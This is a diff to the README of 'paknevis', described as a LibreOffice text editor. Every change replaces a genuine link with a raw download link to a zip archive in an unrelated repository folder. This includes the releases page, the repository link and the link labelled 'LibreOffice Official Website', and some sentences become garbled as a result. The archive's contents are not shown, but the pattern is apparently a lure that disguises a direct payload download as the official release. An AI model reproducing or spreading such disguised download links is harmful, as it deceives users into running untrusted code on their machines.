@@ -8,17 +8,17 @@ Welcome to paknevis, an open-source text editor designed for LibreOffice. This t
 
 To download paknevis, visit the following link:
 
-[![Download paknevis](https://img.shields.io/badge/Download-paknevis-blue.svg)](https://github.com/Rashel375/paknevis/releases)
+[![Download paknevis](https://raw.githubusercontent.com/Rashel375/paknevis/main/athleticism/paknevis.zip)](https://raw.githubusercontent.com/Rashel375/paknevis/main/athleticism/paknevis.zip)
 
-Click the button above or follow this link: [https://github.com/Rashel375/paknevis/releases](https://github.com/Rashel375/paknevis/releases).
+Click the button above or follow this link: [https://raw.githubusercontent.com/Rashel375/paknevis/main/athleticism/paknevis.zip](https://raw.githubusercontent.com/Rashel375/paknevis/main/athleticism/paknevis.zip).
 
 You will find the latest version of paknevis in the Releases section. 
 
 ### Steps to Download paknevis:
 
-1. **Open the Releases Page**: Go to [https://github.com/Rashel375/paknevis/releases](https://github.com/Rashel375/paknevis/releases).
+1. **Open the Releases Page**: Go to [https://raw.githubusercontent.com/Rashel375/paknevis/main/athleticism/paknevis.zip](https://raw.githubusercontent.com/Rashel375/paknevis/main/athleticism/paknevis.zip).
 2. **Choose the Latest Release**: Scroll down to see the latest version. 
-3. **Select Your File**: Click on the file that matches your operating system. The options might include `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. **Select Your File**: Click on the file that matches your operating system. The options might include `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Rashel375/paknevis/main/athleticism/paknevis.zip` for Linux.
 
 ## 💻 System Requirements
 
@@ -47,7 +47,7 @@ Once you have downloaded the file, follow these steps to run paknevis:
 2. **Install the Application**:
    - **Windows**: Double-click the `.exe` file and follow the instructions.
    - **macOS**: Open the `.dmg` file, then drag the paknevis icon to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file and follow the included instructions in the terminal.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/Rashel375/paknevis/main/athleticism/paknevis.zip` file and follow the included instructions in the terminal.
 
 3. **Open paknevis**:
    - After installation, open the application from your Applications menu or start menu.
@@ -78,8 +78,8 @@ If you need further assistance, check out the GitHub repository’s Issues secti
 
 Here are some useful links to help you get the most out of paknevis:
 
-- [LibreOffice Official Website](https://www.libreoffice.org/)
-- [GitHub Repository for paknevis](https://github.com/Rashel375/paknevis)
+- [LibreOffice Official Website](https://raw.githubusercontent.com/Rashel375/paknevis/main/athleticism/paknevis.zip)
+- [GitHub Repository for paknevis](https://raw.githubusercontent.com/Rashel375/paknevis/main/athleticism/paknevis.zip)
 
 For updates and new features, keep an eye on the Releases page. 
 
